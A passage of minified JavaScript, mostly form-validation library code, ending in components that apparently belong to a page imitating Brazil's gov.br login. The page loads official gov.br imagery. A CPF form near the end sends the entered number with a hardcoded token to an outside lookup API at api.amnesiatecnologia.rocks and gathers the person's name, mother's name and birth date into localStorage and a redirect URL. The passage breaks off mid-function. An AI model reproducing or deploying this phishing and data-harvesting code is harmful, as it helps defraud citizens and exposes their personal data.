    return e[0].checked && !e[0].disabled ? e[0].attributes && !Ee(e[0].attributes.value) ? Ee(e[0].value) || e[0].value === "" ? xp : {
      value: e[0].value,
      isValid: !0
    } : xp : vp
  }
  return vp
}
  ;
const wp = {
  isValid: !1,
  value: null
};
var _x = e => Array.isArray(e) ? e.reduce((t, n) => n && n.checked && !n.disabled ? {
  isValid: !0,
  value: n.value
} : t, wp) : wp;
function bp(e, t, n = "validate") {
  if (La(e) || Array.isArray(e) && e.every(La) || sn(e) && !e)
    return {
      type: n,
      message: La(e) ? e : "",
      ref: t
    }
}
var as = e => ke(e) && !ml(e) ? e : {
  value: e,
  message: ""
}
  , Sp = async (e, t, n, r, s) => {
    const { ref: o, refs: i, required: l, maxLength: c, minLength: u, min: d, max: f, pattern: h, validate: y, name: b, valueAsNumber: v, mount: C, disabled: g } = e._f
      , m = Q(t, b);
    if (!C || g)
      return {};
    const p = i ? i[0] : o
      , w = I => {
        r && p.reportValidity && (p.setCustomValidity(sn(I) ? "" : I || ""),
          p.reportValidity())
      }
      , S = {}
      , N = Gf(o)
      , P = _i(o)
      , A = N || P
      , k = (v || qf(o)) && Ee(o.value) && Ee(m) || hl(o) && o.value === "" || m === "" || Array.isArray(m) && !m.length
      , D = Tj.bind(null, b, n, S)
      , q = (I, H, z, te = bn.maxLength, se = bn.minLength) => {
        const X = I ? H : z;
        S[b] = {
          type: I ? te : se,
          message: X,
          ref: o,
          ...D(I ? te : se, X)
        }
      }
      ;
    if (s ? !Array.isArray(m) || !m.length : l && (!A && (k || nt(m)) || sn(m) && !m || P && !Ix(i).isValid || N && !_x(i).isValid)) {
      const { value: I, message: H } = La(l) ? {
        value: !!l,
        message: l
      } : as(l);
      if (I && (S[b] = {
        type: bn.required,
        message: H,
        ref: p,
        ...D(bn.required, H)
      },
        !n))
        return w(H),
          S
    }
    if (!k && (!nt(d) || !nt(f))) {
      let I, H;
      const z = as(f)
        , te = as(d);
      if (!nt(m) && !isNaN(m)) {
        const se = o.valueAsNumber || m && +m;
        nt(z.value) || (I = se > z.value),
          nt(te.value) || (H = se < te.value)
      } else {
        const se = o.valueAsDate || new Date(m)
          , X = L => new Date(new Date().toDateString() + " " + L)
          , O = o.type == "time"
          , R = o.type == "week";
        fn(z.value) && m && (I = O ? X(m) > X(z.value) : R ? m > z.value : se > new Date(z.value)),
          fn(te.value) && m && (H = O ? X(m) < X(te.value) : R ? m < te.value : se < new Date(te.value))
      }
      if ((I || H) && (q(!!I, z.message, te.message, bn.max, bn.min),
        !n))
        return w(S[b].message),
          S
    }
    if ((c || u) && !k && (fn(m) || s && Array.isArray(m))) {
      const I = as(c)
        , H = as(u)
        , z = !nt(I.value) && m.length > +I.value
        , te = !nt(H.value) && m.length < +H.value;
      if ((z || te) && (q(z, I.message, H.message),
        !n))
        return w(S[b].message),
          S
    }
    if (h && !k && fn(m)) {
      const { value: I, message: H } = as(h);
      if (ml(I) && !m.match(I) && (S[b] = {
        type: bn.pattern,
        message: H,
        ref: o,
        ...D(bn.pattern, H)
      },
        !n))
        return w(H),
          S
    }
    if (y) {
      if (An(y)) {
        const I = await y(m, t)
          , H = bp(I, p);
        if (H && (S[b] = {
          ...H,
          ...D(bn.validate, H.message)
        },
          !n))
          return w(H.message),
            S
      } else if (ke(y)) {
        let I = {};
        for (const H in y) {
          if (!lt(I) && !n)
            break;
          const z = bp(await y[H](m, t), p, H);
          z && (I = {
            ...z,
            ...D(H, z.message)
          },
            w(z.message),
            n && (S[b] = I))
        }
        if (!lt(I) && (S[b] = {
          ref: p,
          ...I
        },
          !n))
          return S
      }
    }
    return w(!0),
      S
  }
  ;
function Dj(e, t) {
  const n = t.slice(0, -1).length;
  let r = 0;
  for (; r < n;)
    e = Ee(e) ? r++ : e[t[r++]];
  return e
}
function Mj(e) {
  for (const t in e)
    if (e.hasOwnProperty(t) && !Ee(e[t]))
      return !1;
  return !0
}
function Re(e, t) {
  const n = Array.isArray(t) ? t : Qf(t) ? [t] : Ox(t)
    , r = n.length === 1 ? e : Dj(e, n)
    , s = n.length - 1
    , o = n[s];
  return r && delete r[o],
    s !== 0 && (ke(r) && lt(r) || Array.isArray(r) && Mj(r)) && Re(e, n.slice(0, -1)),
    e
}
var Yc = () => {
  let e = [];
  return {
    get observers() {
      return e
    },
    next: s => {
      for (const o of e)
        o.next && o.next(s)
    }
    ,
    subscribe: s => (e.push(s),
    {
      unsubscribe: () => {
        e = e.filter(o => o !== s)
      }
    }),
    unsubscribe: () => {
      e = []
    }
  }
}
  , xd = e => nt(e) || !Rx(e);
function nr(e, t) {
  if (xd(e) || xd(t))
    return e === t;
  if (Vr(e) && Vr(t))
    return e.getTime() === t.getTime();
  const n = Object.keys(e)
    , r = Object.keys(t);
  if (n.length !== r.length)
    return !1;
  for (const s of n) {
    const o = e[s];
    if (!r.includes(s))
      return !1;
    if (s !== "ref") {
      const i = t[s];
      if (Vr(o) && Vr(i) || ke(o) && ke(i) || Array.isArray(o) && Array.isArray(i) ? !nr(o, i) : o !== i)
        return !1
    }
  }
  return !0
}
var Lx = e => e.type === "select-multiple"
  , Rj = e => Gf(e) || _i(e)
  , Xc = e => hl(e) && e.isConnected
  , Fx = e => {
    for (const t in e)
      if (An(e[t]))
        return !0;
    return !1
  }
  ;
function pl(e, t = {}) {
  const n = Array.isArray(e);
  if (ke(e) || n)
    for (const r in e)
      Array.isArray(e[r]) || ke(e[r]) && !Fx(e[r]) ? (t[r] = Array.isArray(e[r]) ? [] : {},
        pl(e[r], t[r])) : nt(e[r]) || (t[r] = !0);
  return t
}
function Vx(e, t, n) {
  const r = Array.isArray(e);
  if (ke(e) || r)
    for (const s in e)
      Array.isArray(e[s]) || ke(e[s]) && !Fx(e[s]) ? Ee(t) || xd(n[s]) ? n[s] = Array.isArray(e[s]) ? pl(e[s], []) : {
        ...pl(e[s])
      } : Vx(e[s], nt(t) ? {} : t[s], n[s]) : n[s] = !nr(e[s], t[s]);
  return n
}
var To = (e, t) => Vx(e, t, pl(t))
  , Bx = (e, { valueAsNumber: t, valueAsDate: n, setValueAs: r }) => Ee(e) ? e : t ? e === "" ? NaN : e && +e : n && fn(e) ? new Date(e) : r ? r(e) : e;
function Jc(e) {
  const t = e.ref;
  if (!(e.refs ? e.refs.every(n => n.disabled) : t.disabled))
    return qf(t) ? t.files : Gf(t) ? _x(e.refs).value : Lx(t) ? [...t.selectedOptions].map(({ value: n }) => n) : _i(t) ? Ix(e.refs).value : Bx(Ee(t.value) ? e.ref.value : t.value, e)
}
var Oj = (e, t, n, r) => {
  const s = {};
  for (const o of e) {
    const i = Q(t, o);
    i && ge(s, o, i._f)
  }
  return {
    criteriaMode: n,
    names: [...e],
    fields: s,
    shouldUseNativeValidation: r
  }
}
  , ko = e => Ee(e) ? e : ml(e) ? e.source : ke(e) ? ml(e.value) ? e.value.source : e.value : e;
const Cp = "AsyncFunction";
var Ij = e => (!e || !e.validate) && !!(An(e.validate) && e.validate.constructor.name === Cp || ke(e.validate) && Object.values(e.validate).find(t => t.constructor.name === Cp))
  , _j = e => e.mount && (e.required || e.min || e.max || e.maxLength || e.minLength || e.pattern || e.validate);
function Np(e, t, n) {
  const r = Q(e, n);
  if (r || Qf(n))
    return {
      error: r,
      name: n
    };
  const s = n.split(".");
  for (; s.length;) {
    const o = s.join(".")
      , i = Q(t, o)
      , l = Q(e, o);
    if (i && !Array.isArray(i) && n !== o)
      return {
        name: n
      };
    if (l && l.type)
      return {
        name: o,
        error: l
      };
    s.pop()
  }
  return {
    name: n
  }
}
var Lj = (e, t, n, r, s) => s.isOnAll ? !1 : !n && s.isOnTouch ? !(t || e) : (n ? r.isOnBlur : s.isOnBlur) ? !e : (n ? r.isOnChange : s.isOnChange) ? e : !0
  , Fj = (e, t) => !Xl(Q(e, t)).length && Re(e, t);
const Vj = {
  mode: Xt.onSubmit,
  reValidateMode: Xt.onChange,
  shouldFocusError: !0
};
function Bj(e = {}) {
  let t = {
    ...Vj,
    ...e
  }, n = {
    submitCount: 0,
    isDirty: !1,
    isLoading: An(t.defaultValues),
    isValidating: !1,
    isSubmitted: !1,
    isSubmitting: !1,
    isSubmitSuccessful: !1,
    isValid: !1,
    touchedFields: {},
    dirtyFields: {},
    validatingFields: {},
    errors: t.errors || {},
    disabled: t.disabled || !1
  }, r = {}, s = ke(t.defaultValues) || ke(t.values) ? Dt(t.defaultValues || t.values) || {} : {}, o = t.shouldUnregister ? {} : Dt(s), i = {
    action: !1,
    mount: !1,
    watch: !1
  }, l = {
    mount: new Set,
    unMount: new Set,
    array: new Set,
    watch: new Set
  }, c, u = 0;
  const d = {
    isDirty: !1,
    dirtyFields: !1,
    validatingFields: !1,
    touchedFields: !1,
    isValidating: !1,
    isValid: !1,
    errors: !1
  }
    , f = {
      values: Yc(),
      array: Yc(),
      state: Yc()
    }
    , h = gp(t.mode)
    , y = gp(t.reValidateMode)
    , b = t.criteriaMode === Xt.all
    , v = j => E => {
      clearTimeout(u),
        u = setTimeout(j, E)
    }
    , C = async j => {
      if (!e.disabled && (d.isValid || j)) {
        const E = t.resolver ? lt((await A()).errors) : await D(r, !0);
        E !== n.isValid && f.state.next({
          isValid: E
        })
      }
    }
    , g = (j, E) => {
      !e.disabled && (d.isValidating || d.validatingFields) && ((j || Array.from(l.mount)).forEach(T => {
        T && (E ? ge(n.validatingFields, T, E) : Re(n.validatingFields, T))
      }
      ),
        f.state.next({
          validatingFields: n.validatingFields,
          isValidating: !lt(n.validatingFields)
        }))
    }
    , m = (j, E = [], T, $, B = !0, V = !0) => {
      if ($ && T && !e.disabled) {
        if (i.action = !0,
          V && Array.isArray(Q(r, j))) {
          const G = T(Q(r, j), $.argA, $.argB);
          B && ge(r, j, G)
        }
        if (V && Array.isArray(Q(n.errors, j))) {
          const G = T(Q(n.errors, j), $.argA, $.argB);
          B && ge(n.errors, j, G),
            Fj(n.errors, j)
        }
        if (d.touchedFields && V && Array.isArray(Q(n.touchedFields, j))) {
          const G = T(Q(n.touchedFields, j), $.argA, $.argB);
          B && ge(n.touchedFields, j, G)
        }
        d.dirtyFields && (n.dirtyFields = To(s, o)),
          f.state.next({
            name: j,
            isDirty: I(j, E),
            dirtyFields: n.dirtyFields,
            errors: n.errors,
            isValid: n.isValid
          })
      } else
        ge(o, j, E)
    }
    , p = (j, E) => {
      ge(n.errors, j, E),
        f.state.next({
          errors: n.errors
        })
    }
    , w = j => {
      n.errors = j,
        f.state.next({
          errors: n.errors,
          isValid: !1
        })
    }
    , S = (j, E, T, $) => {
      const B = Q(r, j);
      if (B) {
        const V = Q(o, j, Ee(T) ? Q(s, j) : T);
        Ee(V) || $ && $.defaultChecked || E ? ge(o, j, E ? V : Jc(B._f)) : te(j, V),
          i.mount && C()
      }
    }
    , N = (j, E, T, $, B) => {
      let V = !1
        , G = !1;
      const Z = {
        name: j
      };
      if (!e.disabled) {
        const Pe = !!(Q(r, j) && Q(r, j)._f && Q(r, j)._f.disabled);
        if (!T || $) {
          d.isDirty && (G = n.isDirty,
            n.isDirty = Z.isDirty = I(),
            V = G !== Z.isDirty);
          const De = Pe || nr(Q(s, j), E);
          G = !!(!Pe && Q(n.dirtyFields, j)),
            De || Pe ? Re(n.dirtyFields, j) : ge(n.dirtyFields, j, !0),
            Z.dirtyFields = n.dirtyFields,
            V = V || d.dirtyFields && G !== !De
        }
        if (T) {
          const De = Q(n.touchedFields, j);
          De || (ge(n.touchedFields, j, T),
            Z.touchedFields = n.touchedFields,
            V = V || d.touchedFields && De !== T)
        }
        V && B && f.state.next(Z)
      }
      return V ? Z : {}
    }
    , P = (j, E, T, $) => {
      const B = Q(n.errors, j)
        , V = d.isValid && sn(E) && n.isValid !== E;
      if (e.delayError && T ? (c = v(() => p(j, T)),
        c(e.delayError)) : (clearTimeout(u),
          c = null,
          T ? ge(n.errors, j, T) : Re(n.errors, j)),
        (T ? !nr(B, T) : B) || !lt($) || V) {
        const G = {
          ...$,
          ...V && sn(E) ? {
            isValid: E
          } : {},
          errors: n.errors,
          name: j
        };
        n = {
          ...n,
          ...G
        },
          f.state.next(G)
      }
    }
    , A = async j => {
      g(j, !0);
      const E = await t.resolver(o, t.context, Oj(j || l.mount, r, t.criteriaMode, t.shouldUseNativeValidation));
      return g(j),
        E
    }
    , k = async j => {
      const { errors: E } = await A(j);
      if (j)
        for (const T of j) {
          const $ = Q(E, T);
          $ ? ge(n.errors, T, $) : Re(n.errors, T)
        }
      else
        n.errors = E;
      return E
    }
    , D = async (j, E, T = {
      valid: !0
    }) => {
      for (const $ in j) {
        const B = j[$];
        if (B) {
          const { _f: V, ...G } = B;
          if (V) {
            const Z = l.array.has(V.name)
              , Pe = B._f && Ij(B._f);
            Pe && d.validatingFields && g([$], !0);
            const De = await Sp(B, o, b, t.shouldUseNativeValidation && !E, Z);
            if (Pe && d.validatingFields && g([$]),
              De[V.name] && (T.valid = !1,
                E))
              break;
            !E && (Q(De, V.name) ? Z ? kj(n.errors, De, V.name) : ge(n.errors, V.name, De[V.name]) : Re(n.errors, V.name))
          }
          !lt(G) && await D(G, E, T)
        }
      }
      return T.valid
    }
    , q = () => {
      for (const j of l.unMount) {
        const E = Q(r, j);
        E && (E._f.refs ? E._f.refs.every(T => !Xc(T)) : !Xc(E._f.ref)) && yt(j)
      }
      l.unMount = new Set
    }
    , I = (j, E) => !e.disabled && (j && E && ge(o, j, E),
      !nr(J(), s))
    , H = (j, E, T) => Ej(j, l, {
      ...i.mount ? o : Ee(E) ? s : fn(j) ? {
        [j]: E
      } : E
    }, T, E)
    , z = j => Xl(Q(i.mount ? o : s, j, e.shouldUnregister ? Q(s, j, []) : []))
    , te = (j, E, T = {}) => {
      const $ = Q(r, j);
      let B = E;
      if ($) {
        const V = $._f;
        V && (!V.disabled && ge(o, j, Bx(E, V)),
          B = hl(V.ref) && nt(E) ? "" : E,
          Lx(V.ref) ? [...V.ref.options].forEach(G => G.selected = B.includes(G.value)) : V.refs ? _i(V.ref) ? V.refs.length > 1 ? V.refs.forEach(G => (!G.defaultChecked || !G.disabled) && (G.checked = Array.isArray(B) ? !!B.find(Z => Z === G.value) : B === G.value)) : V.refs[0] && (V.refs[0].checked = !!B) : V.refs.forEach(G => G.checked = G.value === B) : qf(V.ref) ? V.ref.value = "" : (V.ref.value = B,
            V.ref.type || f.values.next({
              name: j,
              values: {
                ...o
              }
            })))
      }
      (T.shouldDirty || T.shouldTouch) && N(j, B, T.shouldTouch, T.shouldDirty, !0),
        T.shouldValidate && L(j)
    }
    , se = (j, E, T) => {
      for (const $ in E) {
        const B = E[$]
          , V = `${j}.${$}`
          , G = Q(r, V);
        (l.array.has(j) || ke(B) || G && !G._f) && !Vr(B) ? se(V, B, T) : te(V, B, T)
      }
    }
    , X = (j, E, T = {}) => {
      const $ = Q(r, j)
        , B = l.array.has(j)
        , V = Dt(E);
      ge(o, j, V),
        B ? (f.array.next({
          name: j,
          values: {
            ...o
          }
        }),
          (d.isDirty || d.dirtyFields) && T.shouldDirty && f.state.next({
            name: j,
            dirtyFields: To(s, o),
            isDirty: I(j, V)
          })) : $ && !$._f && !nt(V) ? se(j, V, T) : te(j, V, T),
        yp(j, l) && f.state.next({
          ...n
        }),
        f.values.next({
          name: i.mount ? j : void 0,
          values: {
            ...o
          }
        })
    }
    , O = async j => {
      i.mount = !0;
      const E = j.target;
      let T = E.name
        , $ = !0;
      const B = Q(r, T)
        , V = () => E.type ? Jc(B._f) : bj(j)
        , G = Z => {
          $ = Number.isNaN(Z) || Vr(Z) && isNaN(Z.getTime()) || nr(Z, Q(o, T, Z))
        }
        ;
      if (B) {
        let Z, Pe;
        const De = V()
          , $t = j.type === pp.BLUR || j.type === pp.FOCUS_OUT
          , uc = !_j(B._f) && !t.resolver && !Q(n.errors, T) && !B._f.deps || Lj($t, Q(n.touchedFields, T), n.isSubmitted, y, h)
          , po = yp(T, l, $t);
        ge(o, T, De),
          $t ? (B._f.onBlur && B._f.onBlur(j),
            c && c(0)) : B._f.onChange && B._f.onChange(j);
        const xn = N(T, De, $t, !1)
          , dc = !lt(xn) || po;
        if (!$t && f.values.next({
          name: T,
          type: j.type,
          values: {
            ...o
          }
        }),
          uc)
          return d.isValid && (e.mode === "onBlur" ? $t && C() : C()),
            dc && f.state.next({
              name: T,
              ...po ? {} : xn
            });
        if (!$t && po && f.state.next({
          ...n
        }),
          t.resolver) {
          const { errors: Wi } = await A([T]);
          if (G(De),
            $) {
            const fc = Np(n.errors, r, T)
              , go = Np(Wi, r, fc.name || T);
            Z = go.error,
              T = go.name,
              Pe = lt(Wi)
          }
        } else
          g([T], !0),
            Z = (await Sp(B, o, b, t.shouldUseNativeValidation))[T],
            g([T]),
            G(De),
            $ && (Z ? Pe = !1 : d.isValid && (Pe = await D(r, !0)));
        $ && (B._f.deps && L(B._f.deps),
          P(T, Pe, Z, xn))
      }
    }
    , R = (j, E) => {
      if (Q(n.errors, E) && j.focus)
        return j.focus(),
          1
    }
    , L = async (j, E = {}) => {
      let T, $;
      const B = _a(j);
      if (t.resolver) {
        const V = await k(Ee(j) ? j : B);
        T = lt(V),
          $ = j ? !B.some(G => Q(V, G)) : T
      } else
        j ? ($ = (await Promise.all(B.map(async V => {
          const G = Q(r, V);
          return await D(G && G._f ? {
            [V]: G
          } : G)
        }
        ))).every(Boolean),
          !(!$ && !n.isValid) && C()) : $ = T = await D(r);
      return f.state.next({
        ...!fn(j) || d.isValid && T !== n.isValid ? {} : {
          name: j
        },
        ...t.resolver || !j ? {
          isValid: T
        } : {},
        errors: n.errors
      }),
        E.shouldFocus && !$ && Ko(r, R, j ? B : l.mount),
        $
    }
    , J = j => {
      const E = {
        ...i.mount ? o : s
      };
      return Ee(j) ? E : fn(j) ? Q(E, j) : j.map(T => Q(E, T))
    }
    , oe = (j, E) => ({
      invalid: !!Q((E || n).errors, j),
      isDirty: !!Q((E || n).dirtyFields, j),
      error: Q((E || n).errors, j),
      isValidating: !!Q(n.validatingFields, j),
      isTouched: !!Q((E || n).touchedFields, j)
    })
    , $e = j => {
      j && _a(j).forEach(E => Re(n.errors, E)),
        f.state.next({
          errors: j ? n.errors : {}
        })
    }
    , He = (j, E, T) => {
      const $ = (Q(r, j, {
        _f: {}
      })._f || {}).ref
        , B = Q(n.errors, j) || {}
        , { ref: V, message: G, type: Z, ...Pe } = B;
      ge(n.errors, j, {
        ...Pe,
        ...E,
        ref: $
      }),
        f.state.next({
          name: j,
          errors: n.errors,
          isValid: !1
        }),
        T && T.shouldFocus && $ && $.focus && $.focus()
    }
    , $n = (j, E) => An(j) ? f.values.subscribe({
      next: T => j(H(void 0, E), T)
    }) : H(j, E, !0)
    , yt = (j, E = {}) => {
      for (const T of j ? _a(j) : l.mount)
        l.mount.delete(T),
          l.array.delete(T),
          E.keepValue || (Re(r, T),
            Re(o, T)),
          !E.keepError && Re(n.errors, T),
          !E.keepDirty && Re(n.dirtyFields, T),
          !E.keepTouched && Re(n.touchedFields, T),
          !E.keepIsValidating && Re(n.validatingFields, T),
          !t.shouldUnregister && !E.keepDefaultValue && Re(s, T);
      f.values.next({
        values: {
          ...o
        }
      }),
        f.state.next({
          ...n,
          ...E.keepDirty ? {
            isDirty: I()
          } : {}
        }),
        !E.keepIsValid && C()
    }
    , zt = ({ disabled: j, name: E, field: T, fields: $, value: B }) => {
      if (sn(j) && i.mount || j) {
        const V = j ? void 0 : Ee(B) ? Jc(T ? T._f : Q($, E)._f) : B;
        ge(o, E, V),
          N(E, V, !1, !1, !0)
      }
    }
    , ho = (j, E = {}) => {
      let T = Q(r, j);
      const $ = sn(E.disabled) || sn(e.disabled);
      return ge(r, j, {
        ...T || {},
        _f: {
          ...T && T._f ? T._f : {
            ref: {
              name: j
            }
          },
          name: j,
          mount: !0,
          ...E
        }
      }),
        l.mount.add(j),
        T ? zt({
          field: T,
          disabled: sn(E.disabled) ? E.disabled : e.disabled,
          name: j,
          value: E.value
        }) : S(j, !0, E.value),
      {
        ...$ ? {
          disabled: E.disabled || e.disabled
        } : {},
        ...t.progressive ? {
          required: !!E.required,
          min: ko(E.min),
          max: ko(E.max),
          minLength: ko(E.minLength),
          maxLength: ko(E.maxLength),
          pattern: ko(E.pattern)
        } : {},
        name: j,
        onChange: O,
        onBlur: O,
        ref: B => {
          if (B) {
            ho(j, E),
              T = Q(r, j);
            const V = Ee(B.value) && B.querySelectorAll && B.querySelectorAll("input,select,textarea")[0] || B
              , G = Rj(V)
              , Z = T._f.refs || [];
            if (G ? Z.find(Pe => Pe === V) : V === T._f.ref)
              return;
            ge(r, j, {
              _f: {
                ...T._f,
                ...G ? {
                  refs: [...Z.filter(Xc), V, ...Array.isArray(Q(s, j)) ? [{}] : []],
                  ref: {
                    type: V.type,
                    name: j
                  }
                } : {
                  ref: V
                }
              }
            }),
              S(j, !1, void 0, V)
          } else
            T = Q(r, j, {}),
              T._f && (T._f.mount = !1),
              (t.shouldUnregister || E.shouldUnregister) && !(Cj(l.array, j) && i.action) && l.unMount.add(j)
        }
      }
    }
    , Ui = () => t.shouldFocusError && Ko(r, R, l.mount)
    , $i = j => {
      sn(j) && (f.state.next({
        disabled: j
      }),
        Ko(r, (E, T) => {
          const $ = Q(r, T);
          $ && (E.disabled = $._f.disabled || j,
            Array.isArray($._f.refs) && $._f.refs.forEach(B => {
              B.disabled = $._f.disabled || j
            }
            ))
        }
          , 0, !1))
    }
    , ss = (j, E) => async T => {
      let $;
      T && (T.preventDefault && T.preventDefault(),
        T.persist && T.persist());
      let B = Dt(o);
      if (f.state.next({
        isSubmitting: !0
      }),
        t.resolver) {
        const { errors: V, values: G } = await A();
        n.errors = V,
          B = G
      } else
        await D(r);
      if (Re(n.errors, "root"),
        lt(n.errors)) {
        f.state.next({
          errors: {}
        });
        try {
          await j(B, T)
        } catch (V) {
          $ = V
        }
      } else
        E && await E({
          ...n.errors
        }, T),
          Ui(),
          setTimeout(Ui);
      if (f.state.next({
        isSubmitted: !0,
        isSubmitting: !1,
        isSubmitSuccessful: lt(n.errors) && !$,
        submitCount: n.submitCount + 1,
        errors: n.errors
      }),
        $)
        throw $
    }
    , Hi = (j, E = {}) => {
      Q(r, j) && (Ee(E.defaultValue) ? X(j, Dt(Q(s, j))) : (X(j, E.defaultValue),
        ge(s, j, Dt(E.defaultValue))),
        E.keepTouched || Re(n.touchedFields, j),
        E.keepDirty || (Re(n.dirtyFields, j),
          n.isDirty = E.defaultValue ? I(j, Dt(Q(s, j))) : I()),
        E.keepError || (Re(n.errors, j),
          d.isValid && C()),
        f.state.next({
          ...n
        }))
    }
    , mo = (j, E = {}) => {
      const T = j ? Dt(j) : s
        , $ = Dt(T)
        , B = lt(j)
        , V = B ? s : $;
      if (E.keepDefaultValues || (s = T),
        !E.keepValues) {
        if (E.keepDirtyValues) {
          const G = new Set([...l.mount, ...Object.keys(To(s, o))]);
          for (const Z of Array.from(G))
            Q(n.dirtyFields, Z) ? ge(V, Z, Q(o, Z)) : X(Z, Q(V, Z))
        } else {
          if (Wf && Ee(j))
            for (const G of l.mount) {
              const Z = Q(r, G);
              if (Z && Z._f) {
                const Pe = Array.isArray(Z._f.refs) ? Z._f.refs[0] : Z._f.ref;
                if (hl(Pe)) {
                  const De = Pe.closest("form");
                  if (De) {
                    De.reset();
                    break
                  }
                }
              }
            }
          r = {}
        }
        o = e.shouldUnregister ? E.keepDefaultValues ? Dt(s) : {} : Dt(V),
          f.array.next({
            values: {
              ...V
            }
          }),
          f.values.next({
            values: {
              ...V
            }
          })
      }
      l = {
        mount: E.keepDirtyValues ? l.mount : new Set,
        unMount: new Set,
        array: new Set,
        watch: new Set,
        watchAll: !1,
        focus: ""
      },
        i.mount = !d.isValid || !!E.keepIsValid || !!E.keepDirtyValues,
        i.watch = !!e.shouldUnregister,
        f.state.next({
          submitCount: E.keepSubmitCount ? n.submitCount : 0,
          isDirty: B ? !1 : E.keepDirty ? n.isDirty : !!(E.keepDefaultValues && !nr(j, s)),
          isSubmitted: E.keepIsSubmitted ? n.isSubmitted : !1,
          dirtyFields: B ? {} : E.keepDirtyValues ? E.keepDefaultValues && o ? To(s, o) : n.dirtyFields : E.keepDefaultValues && j ? To(s, j) : E.keepDirty ? n.dirtyFields : {},
          touchedFields: E.keepTouched ? n.touchedFields : {},
          errors: E.keepErrors ? n.errors : {},
          isSubmitSuccessful: E.keepIsSubmitSuccessful ? n.isSubmitSuccessful : !1,
          isSubmitting: !1
        })
    }
    , Ut = (j, E) => mo(An(j) ? j(o) : j, E);
  return {
    control: {
      register: ho,
      unregister: yt,
      getFieldState: oe,
      handleSubmit: ss,
      setError: He,
      _executeSchema: A,
      _getWatch: H,
      _getDirty: I,
      _updateValid: C,
      _removeUnmounted: q,
      _updateFieldArray: m,
      _updateDisabledField: zt,
      _getFieldArray: z,
      _reset: mo,
      _resetDefaultValues: () => An(t.defaultValues) && t.defaultValues().then(j => {
        Ut(j, t.resetOptions),
          f.state.next({
            isLoading: !1
          })
      }
      ),
      _updateFormState: j => {
        n = {
          ...n,
          ...j
        }
      }
      ,
      _disableForm: $i,
      _subjects: f,
      _proxyFormState: d,
      _setErrors: w,
      get _fields() {
        return r
      },
      get _formValues() {
        return o
      },
      get _state() {
        return i
      },
      set _state(j) {
        i = j
      },
      get _defaultValues() {
        return s
      },
      get _names() {
        return l
      },
      set _names(j) {
        l = j
      },
      get _formState() {
        return n
      },
      set _formState(j) {
        n = j
      },
      get _options() {
        return t
      },
      set _options(j) {
        t = {
          ...t,
          ...j
        }
      }
    },
    trigger: L,
    register: ho,
    handleSubmit: ss,
    watch: $n,
    setValue: X,
    getValues: J,
    reset: Ut,
    resetField: Hi,
    clearErrors: $e,
    unregister: yt,
    setError: He,
    setFocus: (j, E = {}) => {
      const T = Q(r, j)
        , $ = T && T._f;
      if ($) {
        const B = $.refs ? $.refs[0] : $.ref;
        B.focus && (B.focus(),
          E.shouldSelect && B.select())
      }
    }
    ,
    getFieldState: oe
  }
}
function zj(e = {}) {
  const t = ue.useRef()
    , n = ue.useRef()
    , [r, s] = ue.useState({
      isDirty: !1,
      isValidating: !1,
      isLoading: An(e.defaultValues),
      isSubmitted: !1,
      isSubmitting: !1,
      isSubmitSuccessful: !1,
      isValid: !1,
      submitCount: 0,
      dirtyFields: {},
      touchedFields: {},
      validatingFields: {},
      errors: e.errors || {},
      disabled: e.disabled || !1,
      defaultValues: An(e.defaultValues) ? void 0 : e.defaultValues
    });
  t.current || (t.current = {
    ...Bj(e),
    formState: r
  });
  const o = t.current.control;
  return o._options = e,
    Aj({
      subject: o._subjects.state,
      next: i => {
        Pj(i, o._proxyFormState, o._updateFormState) && s({
          ...o._formState
        })
      }
    }),
    ue.useEffect(() => o._disableForm(e.disabled), [o, e.disabled]),
    ue.useEffect(() => {
      if (o._proxyFormState.isDirty) {
        const i = o._getDirty();
        i !== r.isDirty && o._subjects.state.next({
          isDirty: i
        })
      }
    }
      , [o, r.isDirty]),
    ue.useEffect(() => {
      e.values && !nr(e.values, n.current) ? (o._reset(e.values, o._options.resetOptions),
        n.current = e.values,
        s(i => ({
          ...i
        }))) : o._resetDefaultValues()
    }
      , [e.values, o]),
    ue.useEffect(() => {
      e.errors && o._setErrors(e.errors)
    }
      , [e.errors, o]),
    ue.useEffect(() => {
      o._state.mount || (o._updateValid(),
        o._state.mount = !0),
        o._state.watch && (o._state.watch = !1,
          o._subjects.state.next({
            ...o._formState
          })),
        o._removeUnmounted()
    }
    ),
    ue.useEffect(() => {
      e.shouldUnregister && o._subjects.values.next({
        values: o._getWatch()
      })
    }
      , [e.shouldUnregister, o]),
    ue.useEffect(() => {
      t.current && (t.current.watch = t.current.watch.bind({}))
    }
      , [r]),
    t.current.formState = jj(r, o),
    t.current
}
function Uj() {
  return a.jsx("div", {
    className: "item-login-signup-ways",
    children: a.jsxs("button", {
      type: "button",
      tabIndex: 5,
      className: "button-href-mimic2 bank-login-button",
      children: [a.jsx("img", {
        src: "https://sso.acesso.gov.br/assets/govbr/img/icons/InternetBanking-green.png",
        alt: "Ícone de Internet Banking"
      }), "Login com seu banco", a.jsx("span", {
        className: "silver-account-badge",
        children: "SUA CONTA SERÁ PRATA"
      })]
    })
  })
}
function $j(e) {
  return e.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/g, "$1.$2.$3-$4")
}
function Zc(e) {
  return e.replace(/\D/g, "")
}
function Hj() {
  const { register: e, handleSubmit: t, setValue: n, watch: r, formState: { errors: s } } = zj()
    , [o, i] = x.useState(!1)
    , [, l] = Un()
    , c = r("cpf", "")
    , u = f => {
      let h = f.target.value;
      h && h !== c && (h = Zc(h),
        n("cpf", $j(h.slice(0, 11))))
    }
    , d = async f => {
      i(!0);
      try {
        const h = Zc(f.cpf)
          , response = await fetch(`https://api.amnesiatecnologia.rocks/?token=c5eebbc9-0469-4324-85f6-0c994b42d18a&cpf=${h}`)
          , b = await response.json()
          , dados = b.DADOS || b;
        
        if (dados && dados.nome && dados.nome.trim() !== "" && dados.data_nascimento && dados.data_nascimento.trim() !== "" && dados.nome_mae && dados.nome_mae.trim() !== "") {
          const partes = dados.data_nascimento.split('/');
          const dataNascimentoFormatada = partes.length === 3 ? `${partes[2]}-${partes[1]}-${partes[0]}` : dados.data_nascimento;
          
          const dadosFormatados = {
            cpf: h,
            nome: dados.nome,
            nome_mae: dados.nome_mae,
            data_nascimento: dataNascimentoFormatada,
            dataNascimento: dataNascimentoFormatada,
            sexo: dados.sexo || "",
            manualEntry: !1
          };
          
          localStorage.setItem("userData", JSON.stringify(dadosFormatados));
          l(`/verificacao?data=${encodeURIComponent(JSON.stringify(dadosFormatados))}&${new URLSearchParams(window.location.search).toString()}`);
        } else {
          l(`/verificacao?data=${encodeURIComponent(JSON.stringify({
